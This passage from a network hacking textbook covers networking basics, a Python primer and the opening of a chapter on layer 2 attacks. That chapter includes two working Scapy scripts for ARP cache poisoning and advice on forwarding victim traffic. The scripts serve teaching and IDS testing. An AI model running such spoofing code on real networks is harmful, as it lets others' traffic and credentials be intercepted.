+of ﬁrewalls (see Sect. 2.18) nowadays violate this standard by either simply silently
+dropping the packet or even generating a bogus ICMP message. This behavior is
+only useful for the attacker to determine the vendor and maybe even the version of
+the ﬁrewall precious information for an attack.
+2.10 UDP
+UDP (Uniﬁed Datagram Protocol) is, like TCP, a protocol of the transport layer,
+but in contrast to TCP it lacks session support and is therefore classiﬁed as stateless.
+Further on it doesn’t care about packet loss or order and only implements addressing
+of programs through ports. A typical UDP header can be seen in Fig. 2.14.
+UDP works by the principle of “ﬁre and forget” and is mostly used for streaming
+services like internet radio or television, but its also the most common used transport
+protocol for DNS. The advantage of UDP is the size its header adds to the packet
+and therefore the much higher speed.
+2.11 An Example Network
+An Ethernet/TCP/IP network is what you nowadays think of if you hear the term
+network, because it is by far the most common one. Its constructed of ﬁve layers
+instead of the theoretical seven layers of the ISO/OSI model. For short refreshing:
+Ethernet is on Layer 2 ,IP(Internet Protocol) on Layer 3 ,TCP (Transport Control
+Protocol) or UDP (see Sect. 2.10)o n Layer 4–6 and services like HTTP, SMTP,
+FTP onLayer 7 .
+
+2.12 Architecture 17
+Lets see how a HTTP packet passes all those layers one after another. In
+our example we want to get the index page of www.springer.com . First our
+computer parses the URL www.springer.com into the following components: HTTP
+as application protocol to be used, the hostname www, the domain springer ,t h e
+Top-Level-Domain – TLD for short – (com) and at last the resource we try to receivein this case /.
+Armed with these information our computer constructs the following HTTP-
+Header (Layer 7):
+GET / HTTP 1.1
+Host: www.springer.com
+Next we head on to TCP (layers 4–6). It establishes a connection by the use of
+the Three-Way-Handshake addressing the destination port 80 (HTTP) and a randomsource port to connect the browser with the network.
+IP (Layer 3) recognizes that it cannot use www.springer.com for addressing
+since it can only use IP addresses such as 62.50.45.35 so it makes a DNS query toresolve the IP for the hostname. We will learn more about DNS in Chap. 6.N o wI P
+checks if the destination host is in the same network as our computer. This is not thecase therefore a lookup into the routing table is necessary to retrieve the address of
+the next hop. There is no entry for the destination network thus the default gatewayis used to send the packet to the outside world. Last but not least IP writes theaddress of the network card used to send the packet into the source address and ourpacket travels to the next layer.
+On layer 2 the packet gets received by the ethernet protocol. ARP takes care
+about resolving the MAC address of the destination IP address and remembers themin the ARP cache this ensures it doesn’t have to ask the network for every packet.Ethernet writes the MAC of the outgoing network card as source into the headerand forwards the packet to the last layer (physical) in this case the driver of thenetwork card, which will translate the p acket to zeros and ones and transmit it on
+the medium.
+2.12 Architecture
+From the perspective of clients a network can have two logical structures:client/server or peer-to-peer (p2p).
+Aclient/server architecture (e.g. HTTP) consists of a computer (server) that
+implements one or more services and another computer (client) that consumes aservice.
+The client sends a request and the server answers with a response if it likes the
+format of the request and thinks the client is authorized to ask.
+In a Peer-to-Peer-Architecture (e.g. ﬁle sharing) all computers are equal.
+Everyone can admit and consume a service at the same time.
+Most network connections rely on the client/server architecture.
+
+18 2 Network 4 Newbies
+2.13 Gateway
+A gateway connects a network with one or more other networks. The most common
+task of a gateway is to be the so called “default gateway”, the router to whom allpackets are sent, which don’t match any other local routes of a computers routingtable.
+Nowadays a gateway manages the connection of a local area network (LAN)
+with the internet and is therefore equa l to a router. Some decades ago a gateway
+was responsible to translate between different kind of networks like Ethernet andToken-Ring.
+2.14 Router
+Looking at router you can differ at least two kinds: internet routers administered byyour internet service provider (ISP) and home router to connect your LAN to theinternet and hopefully protect you from most attacks.
+Home-Router are also often called gateway s, because they manage the interaction
+of a network with another. They receive al l packets from internal hosts that should
+be send to some computer on the internet, write their own public IP address receivedfrom the ISP as source address into it and forwards them to the next router of theISP.
+Internet routers also forward packets, but they do so by depending on a more
+or less huge routing table. They don’t have a static routing table but use differentprotocols like RIP, OSPF and BGP to shar e routing information between each other
+and ﬁnd the shortest or otherwise quickest way to the desired destination.
+With the help of the command traceroute one can determine all internet
+routers a packet passes between the own co mputer and the destination host at least
+if the router replies on certain packets.
+traceroute www.springer.com
+traceroute to www.springer.com (62.50.45.35)
+1 192.168.1.1 (192.168.1.1) 1.167 ms
+2 xdsl-31-164-168-1.adslplus.ch (31.164.168.1)
+3***
+4 212.161.249.178 (212.161.249.178)
+5 equinix-zurich.interoute.net (194.42.48.74)
+6 xe-3-2-0-0.fra-006-score-1-re0.interoute.net (212.23.43.250)7 ae0-0.fra-006-score-2-re0.interoute.net (84.233.207.94)
+8 ae1-0.prg-001-score-1-re0.interoute.net (84.233.138.209)
+9 ae0-0.prg-001-score-2-re0.interoute.net (84.233.138.206)
+10 ae2-0.ber-alb-score-2-re0.interoute.net (84.233.138.234)
+11 static-62-50-34-47.irtnet.net (62.50.34.47)12 static-62-50-45-35.irtnet.net (62.50.45.35)
+
+2.17 Virtual Private Networks 19
+2.15 Bridge
+A bridge is a layer 2 router that’s sometimes acts as a ﬁrewall.
+2.16 Proxies
+A proxy receives requests from a client and sends them to the destination host
+presuming itself would be the real source of the request. It differs to a router inacting on the layers 4–6 (TCP/UDP) till up to layer 7 (application) instead of playingon layer 3 like a router.
+Most proxies additionally have the possi bility to deeply unders tand the protocol
+they are working on. This way they can suppress other protocols that a client maytry to speak over its port and to ﬁlter dangerous/unwanted contents like spam andmalware. Furthermore a proxy could force a user to authenticate by password orsmart card before he or she is allowed to use its service.
+Normally a proxy must explicitly be conﬁgured by the user. A web proxy, for
+example, gets inserted into a browser’s conﬁguration, but a special kind of proxyexists where a router or ﬁrewall (Sect. 2.18) automatically redirects a connection
+through a proxy without a user realizing it. Such a proxy is called transparent proxy.Most internet service providers nowadays use such a kind of proxy at least on HTTPports for performance reasons. The proxy caches all static web contents like images
+and videos on its hard disk. In some countries transparent proxies are also used tocensor and observe the internet access.
+Some web proxies insert a PROXY-VIA entry into the HTTP header and such
+let a user know that his connection ﬂows over this proxies and which IP address theproxy has. The existence of this header in transparent proxy is unlikely and may bea hint for misconﬁguration or a slacky sysadmin.
+Interested reader could, for example, use the following script to get an overview
+of all HTTP information sent by its browser to every web server they use www.
+codekid.net/cgi-bin/env.pl
+2.17 Virtual Private Networks
+Virtual Private Networks (VPN) is a collection of security mechanisms, whichonly have in common the protection of a connection by using encryption and/orauthentication. Nearly all VPNs suppor t the possibility to secure the access to a
+whole network and thanks to powerful cryptology also protect against spionage andmanipulation. Therefore it operates on the protocol stack either on layer 3, 4 or 7. Itcan be commonly said that the deeper the V PN intercepts the connection the more
+secure it can be, because it can prevent attacks on each layer.
+
+20 2 Network 4 Newbies
+Typical protocols or protocol stacks are IPsec, PPTP and OpenVPN. Mostly they
+are used to connect outside-agencies and to integrate roadrunner (Employees, whichconnect to the company network through a mobile internet connection).
+2.18 Firewalls
+A ﬁrewall is neither a product nor a tiny, magical box with lots of blinking LEDseven if more IT security companies try to let you think so. A ﬁrewall is a security
+concept . It serves to protect the network and c omputers from being attacked and is
+only as effective as the combination of its components.
+Typical parts of a ﬁrewall are a packet ﬁlter, intrusion detection system, intrusion
+prevention system, log analyzer, continuous system updates, virus scanner, proxies,honeypot and/or VPNs.
+Apacket ﬁlter works on layer 3 and 4 and decides which packets shall pass, be
+dropped, rejected or redirected depending on its rule-set.
+Intrusion detection systems can be classiﬁed into two different types: host- and
+network intrusion detection system. A host intrusion detection system (HIDS forshort) locates successful attacks on a local computer by, for example, continuouslychecking all ﬁles and director ies against a database of cryptographic checksums.
+A network intrusion detection system (NIDS) therefore detects attacks in the
+network trafﬁc and can operate on all layers at the same time. Its functionality canbe compared to a virus scanner, because it s earches for signatures of known attacks.
+Additionally it has the possibility to learn what is classiﬁed as normal trafﬁc in anetwork and the anomaly detection component alarms packets that differs from it.
+Attacks recognized by a NIDS can be prevented thanks to a intrusion prevention
+system (IPS). In the easiest case it just inserts the attacking IP address into a list of
+IPs to block and the packet ﬁlter will drop everything from them. Be careful: thisisn’t the best way to deal with attacks. A smart attacker could forge packets fromlegitimate and important systems and cut you completely from the net. Therefore itwould be better to rewrite the attack packets in such a way that they cannot do anydamage any more or to at least protect certain ips from being blacklisted.
+Ahoneypot is a simulated server or whole simulated network of easy to crack
+services. Depending on its purpose it is used to keep script kiddies and crackersaway from production systems, to have a prealert system and to log and analyzenew cracking techniques, viruses, worm codes etc.
+Last but not least the most important component: a continuous system upgrade
+and patch workﬂow! Without current security updates you will never get security atall. A ﬁrewall consists of software like a normal desktop computer.
+
+2.19 Man-in-the-Middle-Attacks 21
+Fig. 2.15 Man-in-the-middle attack
+2.19 Man-in-the-Middle-Attacks
+Man-in-the-middle attacks (Mim- or Mitm attacks for short) behave like a proxy, but
+on an unintentional base. Some individuals therefore consider transparent proxies of
+ISPs a Man-in-the-Middle attack.
+All mim-attacks have in common to par tly or entirely redirect the trafﬁc of
+a victim to themselves and afterwards forward them to the real destination (see
+Fig.2.15).
+This can be realized through different techniques such as ARP-Cache-Poisoning
+(Sect. 4.2), DNS-Spooﬁng (Sect. 6.7) or ICMP Redirection (Sect. 5.10).
+Not only can an attacker steal the complete trafﬁc including sensitive data like
+usernames and passwords, but also drop connections at will and manipulate content
+to fool the victim.
+
+Chapter 3
+Python Basics
+Abstract Python is a dynamic scripting language with the aim to be easy to learn
+and readable. Its name suffers from the English comedy group Monty Pythontherefore its obvious that programming in python should be fun!
+3.1 Every Start Is Simple
+To show that those statements above aren’t only empty phrases let’s start theinteractive Python shell by executing python in a terminal or console of your
+choice. Now you should have a waiting input pr ompt that will immediately execute
+all Python commands you enter so lets face it!
+>>> ska = 42
+>>> print "The answer to live, the universe and everything i s " + str(ska)
+May the author not get doomed for breaking with the holy “hello world” example.
+This two lines show a lot of properties of programming in Python.
+The statement ska = 42 deﬁnes a variable ska and gives it the value of 42.
+42 is a number and because a computer is so mewhat of a big, wicked calculator
+that knows nothing but numbers there are different kinds (see Sect. 3.3). For the
+beginning it’s only important to know that a number is something different forPython than strings which is declared between two quotation marks or single ticks.
+The function print displays the text that it receives as parameter onto the screen
+and the function strpreviously converts the number 42 into a string, because you
+cannot add to different data types. That’s true for numbers, strings and objects.Different number types can operate on each other and are internally converted to
+the most exact kind of number.
+The next example demonstrates the possibility to write short, but still highly
+readable code in Python. Try to guess what the following lines will do:
+>>> for line in file("test.txt"):
+... words = line.split(" ")... print " ".join(reversed(words))
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_323
+
+24 3 Python Basics
+If you guessed that this will read the ﬁle test.txt line by line, splits each line into
+words and writes them in reverse order onto the screen than you are right. Try thiswith a language like Java or C!
+Additionally, the above example shows some properties of Python like enforced
+code indention to deﬁne blocks, which also enhances the readability of the code.
+It should be mentioned that this little intr oduction doesn’t claim to be complete or
+make you a master of Python it should just teach you enough to be able to understandthe source examples in this book. If you would like to learn more about Python theauthor can recommends the book Python 3 published by Springer (ISBN 978-3-642-
+04376-5).
+3.2 The Python Philosophy
+The design principle and philosophy behind Python can be found in PEP-20 “Zenof Python” and read if you enter the following command into the Python shell.
+>>> import this
+The Zen of Python, by Tim Peters
+Beautiful is better than ugly.
+Explicit is better than implicit.
+Simple is better than complex.
+Complex is better than complicated.
+Flat is better than nested.
+Sparse is better than dense.
+Readability counts.
+Special cases aren’t special enough to break the rules.
+Although practicality beats purity.
+Errors should never pass silently.
+Unless explicitly silenced.
+In the face of ambiguity, refuse the temptation to guess.
+There should be one-- and preferably only one --obvious way to do it.
+Although that way may not be obvious at first unless you’re Dutch.
+Now is better than never.
+Although never is often better than *right*now.
+If the implementation is hard to explain, it’s a bad idea.
+If the implementation is easy to explain, it may be a good idea.
+Namespaces are one honking great idea -- let’s do more of those!
+The most important principles in the view of the author:
+1. “batteries included”
+2. “we are all consenting adults here”3. “there should be one–and preferably only one–obvious way to do it”
+
+3.3 Data Types 25
+“Batteries included” means Python has got solutions for common programming
+problems included into its default library like sending an email, fetching a web page
+and even access to a sqlite database.
+Thanks to the principle “We are all consenting adults here” Python will not
+enforce protection for your classes as well as other peoples classes. You can changeor add to a class at runtime.
+3.3 Data Types
+The most important thing for a computer program is data. Without data you cannotread, manipulate and output anything. Data can be of different types and structures.
+Python distinguishes between the data types string and number. Strings are
+characters, words or whole text blocks and numbers can be natural or ﬂoatingnumbers.
+python
+>>> "hello world"
+>>> 1>>> 2.34567890
+Strings can be between single or double quotes. Text that spreads more than one
+line must be deﬁned with three double quotes.
+"""Some really big and long
+text that spreads more than one
+line but should still be readable
+on a small terminal screen"""
+Data types can get converted into other types. You have already seen that you
+must convert a number if you want to combine it with a string. The followingintegrated functions can be used for conversation purpose str(),int() andﬂoat() .
+f = 42.23
+i = int(f)
+If you want to be totally exact then one should say that Python only knows one
+data type called object. All other types like string, integer, ﬂoat or more exoticones like HTTP response and TCP packet inherit from it. What exactly an objectis and how object oriented programming works is beyond the scope of this shortintroduction and is not needed to understand the source codes on the followingpages.
+Three data types are somewhat unusual:
+1.None represents the total emp tiness, the absence of a value and is also used to
+indicate errors.
+2.True is the truth and nothing but the truth.
+3.False deﬁnes the falsehood but it is not a lie because a computer cannot lie.
+
+26 3 Python Basics
+3.4 Data Structures
+Data can be organized in several structures or – easier said – can be saved in different
+containers. A variable can only store exactly one value regardless if it is a number,
+string or a complex object.
+var1 = "hello world"
+var2 = 42
+If you like to save more than one value in a ﬁxed order you usually use a list.
+buy = [’bread’, ’milk’, ’cookies’]
+Python let you store different types together in one list.
+list = [’mooh’, 3, ’test’, 7]
+Append adds data to the end of the list, deldeletes it and the access is controlled
+by the index number of a value starting by zero.
+print list[2]
+del list[2]
+list.append(’maeh’)
+The number of elements in a list can be queried with len() .
+If you need an immutable list you otherwise use a tupel .
+tupel = (’mooh’, 3, ’test’, 7)
+Dictionaries , store key-value-pairs in an unordered fashion. A key can be of
+whatever data type you like, but usually strings are used. You could even mixdifferent data types, but the author advises sticking by one and preferring strings.
+phonebook = {’donald’: 12345,
+’roland’: 34223,
+’peter parker’: 77742}
+The access and assignment occurs over the use of the key, deletion is still handled
+bydel.
+print phonebook[’donald’]
+del phonebook[’peter parker’]
+phonebook[’pippi langstrumpf’] = 84109
+Asetis like a dictionary that only consist of keys. Therefore its commonly used
+to avoid duplicate data.
+set = set((1, 2, 3))
+
+3.5 Functions 27
+3.5 Functions
+It’s nice to know how you can save a lot a data, but what about manipulating it? Most
+of the time the answer is: through functions. First we discuss common functionsintegrated into Python and afterwards how you can write your own. The easiest andmost used function for sure is print .
+print "hello sunshine"
+If you want to print something different than a string you must ﬁrst of all convert
+the data type to a string. This can be done with the function str() or by using so
+called format strings .
+book = "neuromancer"
+times = 2
+print "i have read %s only %d times by now" % (book, times)
+The format strings deﬁne what data type should be outputted and converts
+it on the ﬂy. %sstands for string, %d for digit (integer) and %ffor ﬂoat. If
+you need more formats please have a look at the ofﬁcial Python documentation
+doc.python.org .
+Another often used function is open to open a ﬁle.
+file = open("test.txt")
+file.writeline("a lot of important information")
+file.close()
+If you combine both functions you can easily dump the contents of a ﬁle to the
+screen.
+file = open("test.txt")
+print file.read()
+file.close()
+Especially scanning- and fuzzing techniques usually use another function range ,
+which will generate a list of numbers by deﬁning a start and if you like also a stopand a step number.
+range(23, 42)
+A complete overview of all integrated functions and their usage is far beyond
+the scope of this book, but you can ﬁnd very good documentation by pointing yourbrowser at doc.python.org .
+Last but not least, let us write a function of our own.
+def greet(name):
+print "Hello " + name
+greet(’Lucy’)
+
+28 3 Python Basics
+The keyword def starts a new function deﬁnition, afterwards you will ﬁnd
+optional parameters in round parenthese s. Parameters can be named or unnamed
+like in the example above and they can have default values.
+def add(a=1, b=1):
+return a + b
+The function body must be indented and follows the function header. The
+enforced indention is a specialty of Python. Where other programming languagesuse curly brackets or keywords like begin and end, Python uses indentation toindicate a block. What every programmer nevertheless should practice to optimizecode readability is used for structuri ng. The last unknown keyword from the
+examplereturn serves to return a value to the code that has called the function.
+Without an explicit return the function would return the value None .
+print add(173, 91)
+3.6 Control Structures
+By now our programs runs top down without taking shortcuts or making any
+decisions. Time to change that!
+The ﬁrst control structure lstinlineif checks the truth of an expression. In most
+cases this it examines if a variable has a certain value or if the length of a list isbigger than zero.
+a = "mooh"
+if a == "mooh":
+print "Jippie"
+A short note about truth in Python: The data type None and an empty string
+or list are both equal to False ! The following examples are therefore all untrue.
+You should remember this or write it down on one of these famous yellow stickiesdecorating most monitors in the world.
+a=[ ]
+if a: print "Hooray"
+b = None
+if b: print "Donald has luck"
+c=" "
+if c: print "I love rain"
+If the checked expression is untrue one could execute code in the elseblock.
+
+3.6 Control Structures 29
+list = [range(10)]
+if len(list) < 0:
+print ":("
+else:
+print ":)"
+If you have more than one condition to test on your list you can deﬁne more using
+elif, but be aware that all conditions are ch ecked in the order they are speciﬁed and
+the ﬁrst that is true wins.
+list = [range(10)]
+if len(list) < 0:
+print ":("
+elif len(list) > 0 and len(list) < 10:
+print ":)"
+else:
+print ":D"
+The last example also shows how you can combine conditions with so called
+boolean operators . You just chain them with and andorto deﬁne if both or just
+one condition has to be true to make the whole expression true. The operator not
+negates an condition. Additionally it should be noted that you can group expressionsby using round brackets and you can combine as many conditions as you likedemonstrated by the next example:
+a=2 3
+b=4 2
+if (a < 10 and b > 10) or
+(a > 10 and b < 10) or( (a and not b) and a == 10):
+do_something_very_complicated()
+The last control structures we discuss here are loops . Python compared to other
+languages only knows two of them for andwhile . Both ensure that a certain code
+block gets executed over and over again and differ only in their cancel condition.
+Aforloops runs till the end of an iterable data type like a list, tupel, set etc. is
+reached.
+books = (’the art of deception’,
+’spiderman’,
+’firestarter’)
+for book in books:
+print book
+
+30 3 Python Basics
+A nice usage of a for loop is to output the contents of a ﬁle:
+for line in open("test.txt"):
+print line
+The while loop in contrast runs as long as the condition deﬁned in its head is
+true.
+x=1
+while x < 10:
+print "%s" % xx=x+1
+3.7 Modules
+The large Python community has written a module for nearly all the problems on
+earth. You can download them for free including their source code and utilize themin your own programs. In the following chapters we will make extensive use ofPythons module system. You load a module with the help of the import keyword.
+import sys
+print sys.versionsys.exit(1)
+If you would like to apply functions without prepending their module name you
+must import them as follows:
+from sys import exit
+exit(1)
+A special solution to import all functions of a module exists via *but the author
+advises not using, because it can lead to ugly, very hard to debug name collision.
+from sys import *
+exit(1)
+Thanks to Python’s “batteries included” philosophy you get a huge collection
+of modules directly included into every Python installation, the so called standardlibrary. It has solutions for a wide variety of tasks like access to the operating andﬁle system ( sysandos), HTTP and web access ( urllib ,urllib2 ,httplib ,htmllib
+andcookielib ), FTP ( ftplib ), Telnet ( telnetlib ), SMTP ( smtplib ) and much more. It
+pays out to poke in the documentation either online on doc.python.org or by typing
+pydoc <module> into the console.
+
+3.9 Regular Expressions 31
+Last but not least let us write a module of our own. Its as easy as creating a
+directory (e.g. mymodule) and put a ﬁle named __init__.py into it. __init__.py
+signalizes Python that this directory shoul d be treated as a package and can initialize
+the import of your module (what we wont cover here). Create another ﬁle in thedirectory called test.py and deﬁne the function add() as described in Sect. 3.5.
+That’s it! Now you can use your module as follows:
+from mymodul.test import add
+print add(1, 2)
+3.8 Exceptions
+Exceptions treat as the name i mplies exceptions such as a full hard disk, unavailable
+ﬁle or a broken network connection, but also errors like SyntaxError (misuse of
+the languages grammar), NameError (you tried to call an unavailable attribute) or
+ImportError (importing a module or function from a module that doesn’t exist).
+When an exception doesn’t get caught by your program code it will be presented
+to the poor fellow that is sitting before the sc reen. It describes the cause, the exact
+place it occurred and the call stack that le d to it. As a programmer such a stack trace
+is of great importance to identify and ﬁx the error, but you should avoid presentingit to the user and therefore try to catch co mmon exceptions especially if you could
+react on them like trying to reconnect afte r a short timeout if the network wasn’t
+reachable. To catch an exception you use a try/except block around the code that
+might throw the expected exception. Th e name of the exception follows the except
+keyword and afterwards comes the code that gets executed in a case of failure.
+try:
+fh = open("somefile", "r")
+except IOError:
+print "Cannot read somefile"
+3.9 Regular Expressions
+With the aid of regular expressions you are able to express complex search as well
+as search and replace patterns. They can be a curse and mercy at the same time,
+because its quite easy to construct such unread able complex patterns that introduce
+a security risk or cannot be debugged by normal mankind, but if you master themand keep it simple they are a very cool tool.
+
+32 3 Python Basics
+So how do regular expressions work in Python? First of all you need to import the
+module rethat among others provides the two functions search andsub.Search
+as the name implies serves to search for something and sub to replace something.
+Here is an example:
+>>> import re
+>>> test="<a href=’http://www.datenterrorist.de’>Click</a>">>> match = re.search(r"href=[\’\"](.+)[\’\"]", test)
+>>> match.group(1)
+’http://www.datenterrorist.de’
+The above example shows how quick a regular expression can get harder to read,
+but let’s face it line by line. After importing the re module we declare the variabletest that includes a HTML link as string.
+In the next line we use a regular expression to search in the variable test for
+something that follows the keyword href, an equal sign and stands between eithersingle or double quotes.
+Round paranthesis form a group. The search function returns a matching object
+with the method group and the index of the group so group(1) orgroup(2)
+returns the ﬁrst or the second content of a group, but only if the regular expressiondid match. You can give a group a name and use that rather than the index number.To see an example please point your browser at docs.python.org/library/re.html .
+The expression inside of the round parenthesis .+deﬁnes that anything (.) must
+appear at least one time till indeﬁnitely (+).
+An overview over the most important expressions and their meaning can be found
+in Table 3.1.
+Now let’s search and r eplace the link with http://www.springer.com .
+>>> re.sub(match.group(1), "http://www.springer.com", test, \
+re.DOTALL | re.MULTILINE)
+"<a href=’http://www.springer.com’>Click</a>"
+Table 3.1 Regular expressions
+Character Meaning
+. Any character
+\d Only digits
+\D Everything except digits
+\w Alphabetic characters and special signs
+\W All except alphabetic characters and special signs
+\s Space and tabulator
+[a-z] A character from the list a-z
+* The prepending character or expression can occur zero to one times
++ The prepending character or expression can occur one to unlimited times
+? The prepending character or expression must occur zero to one times
+1, 4 The prepending character or expression must occur one to four times
+
+3.10 Sockets 33
+V oila the only difference is the usage of the sub function together with the two
+optionsre.DOTALL andre.MULTILINE . Normally you wouldn’t need them for
+this easy example, but they are so commonly used that they should be mentionedhere.re.DOTALL takes care that the . operator mat ches all characters including
+newlines and thanks to re.MULTILINE the expression can spread more than one
+line.
+3.10 Sockets
+Sockets are the operating system interface to the network. Every action you take ina network (and not only in the TCP/IP universe) sooner or later passes through asocket into kernel space. Most application programmers nowadays use quite highleveled libraries that hide the low level socket code from their users and most of thetime you wont need to directly program with sockets, but hey this is a networkhacking book isn’t it? Therefore we must play with the lowest layer the kernelprovides us :)
+To keep the example as simple as possible but to write both server and client
+code let us program an echo server that just sends back every bit of information itreceives.
+1#!/usr/bin/python
+2
+3import socket
+45HOST = ’localhost’
+6PORT = 1337
+7
+8s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+9s.bind((HOST, PORT))
+10s.listen(1)
+11
+12conn, addr = s.accept()
+13
+14print ’Connected by’, addr
+15
+16while 1:
+17 data = conn.recv(1024)
+18 if not data: break
+19 conn.send(data)
+2021conn.close()
+The method socket.socket(socket.AF_INET, socket.SOCK_STREAM) cre-
+ates a new TCP socket, binds it to the IP of localhost and port 1337 with the help of
+
+34 3 Python Basics
+the method bind() . The function accept() waits until someone connects and returns
+a new socket to that client and its IP address.
+The following while loop reads 1024 byte by using recv() as long as there is
+data on the socket and sends it back to the client by applying the function send() .I f
+there isn’t any data left on the socket the loop will stop and the socket gets cleanlydisconnected and closed by calling close() on it.
+To test the functionality of our echo server of course we also need a client.
+You could just lazily use the famous network swiss knife GNU-Netcat ( netcat.
+sourceforge.net ) or join the fun in quickly coding it on your own. As this is a
+introduction you should of course choose the last option.
+1#!/usr/bin/python
+23import socket
+4
+5HOST = ’localhost’
+6PORT = 1337
+7
+8s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+9s.connect((HOST, PORT))
+1011s.send(’Hello, world’)
+12data = s.recv(1024)
+1314s.close()
+15print ’Received’, repr(data)
+Again a new socket gets created with the function socket() but this time we
+use the method connect() to let it connect to the host localhost on port 1337. The
+rest of the code should be understandable with the explanations from the previousexample.
+
+Chapter 4
+Layer 2 Attacks
+Abstract We introduce our tour into the wonderful world of network hacking with
+an ambitious chapter about layer 2 attacks. Let us recall layer 2 (see Sect. 2.4)i s
+responsible for addressing packets in an Ethernet with the use of MAC addresses.Beside ARP attacks we will investigate how switches react on DOS attacks and howone can escape out of a VLAN environment.
+4.1 Required Modules
+In Python you don’t have to care about raw sockets or network byte ordering, thusthanks to Scapy programmed by Philippe Biondi Python has the world’s best packetgenerator that is even easy to use. Neither pointer arithmetic is needed like in Libnetand C nor are you limited in a few protocols like in RawIP and Perl or with Scrubyand Ruby. Scapy can construct packets on all OSI layers from ARP over IP/ICMPto TCP/UDP and DNS/DHCP etc. even more unusual protocols are supported likeBOOTP, GPRS, PPPoE, SNMP, Radius, Infrared, L2CAP/HCI, EAP. You will learnmore about it in Sect. 5.13.1 .
+Now let us use Scapy to make some trouble on layer 2! First of all you need to
+install it with the following magic line:
+pip install Scapy
+And there you go with one of the famous classics of man in the middle attacks!
+4.2 ARP-Cache-Poisoning
+The functionality of the protocol ARP (Address Resolution Protocol) was describedin Sect. 2.6. A computer that wants to send an IP packet to another host must
+beforehand request the mac address of the destination by using the ARP protocol.
+This question gets broadcasted to all members of the network. In a perfect world theonly computer that answers is the desired destination. In a not so perfect world anattacker may send its victim every few seconds such an ARP reply packet but withits own MAC address as response and thus redirect the connection to itself. This
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_435
+
+36 4 Layer 2 Attacks
+works because most operating systems accept response packets to questions they
+never asked!
+1#!/usr/bin/python
+23import sys
+4import time
+5from scapy.all import sendp, ARP, Ether
+6
+7if len(sys.argv) < 3:
+8print sys.argv[0] + ": <target> <spoof_ip>"
+9sys.exit(1)
+1011iface = "eth0"
+12target_ip = sys.argv[1]
+13fake_ip = sys.argv[2]
+14
+15ethernet = Ether()
+16arp = ARP(pdst=target_ip,
+17 psrc=fake_ip,
+18 op="is-at")
+19packet = ethernet / arp
+20
+21while True:
+22 sendp(packet, iface=iface)
+23 time.sleep(10)
+With the help of Scapy we construct a packet called packet consisting of an
+Ethernet() and an ARP() header. In the ARP header we set the IP address of the
+victim (target_ip ) and the IP which we would like to hijack all connections
+(fake_ip ). As last parameter we deﬁne the OP-Codeis-at , that declares the
+packet as an ARP response. Afterwards the function sendp() sends the packet in
+an endless loop waiting 10 s between each delivery.
+Its important to note that you have to call the function sendp() and not the
+functionsend() , because the packet should be sent on layer 2. The function
+send() sends packets on layer 3.
+One last thing to remember is to enable IP forwarding otherwise your host would
+block the connection of the victim.
+sysctl net.ipv4.ip_forward=1
+Don’t forget to check the settings of your packet ﬁlter like IPtables, pf or ipfw or
+just disable it, but now enough about the boring theory lets jump into some practicalPython code!
+If you only manipulate the ARP cache of the client with the fake_ip you only
+get the packets of the client, but the responses of the server will stay invisible.Figure 4.1illustrates that case.
+
+4.2 ARP-Cache-Poisoning 37
+Fig. 4.1 One-way-man-in-the-middle
+Fig. 4.2 Bidirectional man-in-the-middle
+To enforce a bidirectional connection through the computer of the attacker like
+in Fig. 4.2the attacker has to forge both the client and the server with his own MAC
+for the relevant destination.
+Our ﬁrst code is a bit graceless and sends a lot of ARP packets. It doesn’t only
+generate more trafﬁc as needed it’s also conspicuous. Stealthy attackers would useanother tactic.
+A computer that wants to get knowledge about an IP address asks with an ARP
+request. We will write a program that waits for ARP requests and sends a spoofedARP response for every received request. In a switched environment this will resultin every connection ﬂowing over the com puter of the attacker, because in every
+ARP cache there will be the attackers MAC for every IP address. This solution is
+more elegant and not as noisy as the one before, but still quite easy to detected for atrained admin.
+The spoofed response packet gets sent in parallel to the response of the real host
+as illustrated in Fig. 4.3. The computer whose packet receives ﬁrst at the victims
+network card wins.
+1#!/usr/bin/python
+2
+3import sys
+4from scapy.all import sniff, sendp, ARP, Ether
+5
+6
+7if len(sys.argv) < 2:
+8print sys.argv[0] + " <iface>"
+
+38 4 Layer 2 Attacks
+Fig. 4.3 ARP-spooﬁng
+9sys.exit(0)
+10
+1112def arp_poison_callback(packet):
+13 # Got ARP request?
+14 if packet[ARP].op == 1:
+15 answer = Ether(dst=packet[ARP].hwsrc) / ARP()
+16 answer[ARP].op = "is-at"
+17 answer[ARP].hwdst = packet[ARP].hwsrc
+18 answer[ARP].psrc = packet[ARP].pdst
+19 answer[ARP].pdst = packet[ARP].psrc
+20
+21 print "Fooling " + packet[ARP].psrc + " that " + \
+22 packet[ARP].pdst + " is me"
+23
+24 sendp(answer, iface=sys.argv[1])
+25
+26sniff(prn=arp_poison_callback,
+27 filter="arp",
+28 iface=sys.argv[1],
+29 store=0)
+The function sniff() reads packets in an endless loop from the interface
+speciﬁed by the parameter iface. The received packets are automaticallyﬁltered by the PCAP ﬁlter arp that guarantees that our callback function
+arp_poison_callback will only get called with ARP packets as input. Due to
+the parameter store=0 the packet will only be saved in memory but not on the harddisk.
+The function arp_poison_callback() handles the real work of our pro-
+gram. First of all it checks the OP code of the ARP packet: when it’s 1 the packetis an ARP request and we generate a response packet, that has the source MAC andIP of the request packet as destination MAC and IP. We don’t deﬁne a source MACthus Scapy automatically insert the addr esses of the sending network interface.
+
+4.3 ARP-Watcher 39
+The IP to MAC resolution of ARP will get cached for some time, because it
+would be dump to ask for the resolution of the same address over and over again.This ARP cache can be displayed with the following command.
+arp -an
+? (192.168.13.5) at c0:de:de:ad:be:ef [ether] on eth0
+It depends on the operating system, its version and local conﬁguration settings
+on how long addresses will get cached.
+To defend ARP poisoning attacks one could on one side use static ARP entries,
+but those could get overwritten by received ARP responses depending on the ARPhandling code of the operating system on the other side one could use a tool suchas ARP watcher (see Sect. 4.3). ARP watcher keeps an eye on the ARP trafﬁc and
+reports suspicious behavior but will not prevent it. Nowadays most modern IntrusionDetection Systems can detect ARP cache poisoning attacks. You should check the
+functionality of your IDS by using the above scripts to see how it behaves.
+4.3 ARP-Watcher
+Next we write a tiny tool to report all newly connected devices to our networktherefore it has to remember all IP to MAC resolutions. Additionally it can detect ifa device suddenly changes its MAC address.
+1#!/usr/bin/python
+2
+3from scapy.all import sniff, ARP
+4from signal import signal, SIGINT
